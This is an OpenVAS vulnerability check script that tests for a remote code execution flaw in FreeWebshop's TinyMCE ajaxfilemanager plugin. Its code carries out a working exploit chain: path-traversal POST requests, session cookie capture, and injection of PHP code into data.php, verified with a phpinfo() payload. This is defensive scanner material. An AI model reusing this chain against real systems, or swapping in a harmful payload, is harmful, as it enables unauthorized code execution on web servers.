###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freewebshop_50694.nasl 7573 2017-10-26 09:18:50Z cfischer $
#
# FreeWebshop 'ajax_save_name.php' Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "FreeWebshop is prone to a remote code-execution vulnerability because
the application fails to sufficiently sanitize user-supplied input.

Exploiting this issue will allow attackers to execute arbitrary code
within the context of the affected application.

FreeWebshop 2.2.9 R2 is vulnerable; prior versions may also be
affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103341";
CPE = "cpe:/a:freewebshop:freewebshop";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(50694);
 script_version ("$Revision: 7573 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("FreeWebshop 'ajax_save_name.php' Remote Code Execution Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50694");
 script_xref(name : "URL" , value : "http://www.freewebshop.org");

 script_tag(name:"last_modification", value:"$Date: 2017-10-26 11:18:50 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2011-11-17 08:34:17 +0100 (Thu, 17 Nov 2011)");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("FreeWebShop_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("FreeWebshop/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
function random_mkdir(dir) {

  local_var payload;

  dirname = "openvas-" + rand();

  payload = "new_folder=" + dirname + "&currentFolderPath=../../../up/";

  req = string(
               "POST ",dir,"/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.1\r\n",
	       "Host: ", host,"\r\n",
	       "Content-Length: ", strlen(payload),"\r\n",
	       "Content-Type: application/x-www-form-urlencoded\r\n",
	       "\r\n",
	       payload
	      );

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(result !~ "HTTP/1.. 200" || dirname >!< result)exit(0);

  return dirname;


}  

function exploit(ex, dir) {

  payload = string("selectedDoc[]=",ex,"&currentFolderPath=../../../up/");
  host = get_host_name();

  req = string(
  	     "POST ",dir,"/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_file_cut.php HTTP/1.1\r\n",
	     "Host: ", host,"\r\n",
	     "Content-Length: ", strlen(payload),"\r\n",
	     "Content-Type: application/x-www-form-urlencoded\r\n",
	     "\r\n",
	     payload
            );

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(result !~ "HTTP/1.. 200")exit(0);

  session_id = eregmatch(pattern:"Set-Cookie: ([^;]*);",string:result);
  if(isnull(session_id[1]))exit(0);
  sess = session_id[1];

  dirname = random_mkdir(dir:dir);
  newname = rand();
  payload = "value=" + newname + "&id=../../../up/" + dirname;

  req = string(
  	    "POST ",dir,"/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php HTTP/1.1\r\n",
	    "Host: ", host,"\r\n",
	    "Cookie: ", sess,"\r\n",
	    "Content-Length: ", strlen(payload),"\r\n",
	    "Content-Type: application/x-www-form-urlencoded\r\n",
	    "\r\n",
	    payload
	    );

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if("path" >!< result || newname >!< result)exit(0);

  url = string(dir, "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/data.php"); 
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if( buf == NULL ) exit(0);

  return buf;

}  

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

buf = exploit(ex:"<?php phpinfo(); die; ?>", dir:dir);

if("<title>phpinfo()" >< buf) {

  exploit(ex:"", dir:dir); # clean data.php
  security_message(port:port);
  exit(0);

}  

exit(0);
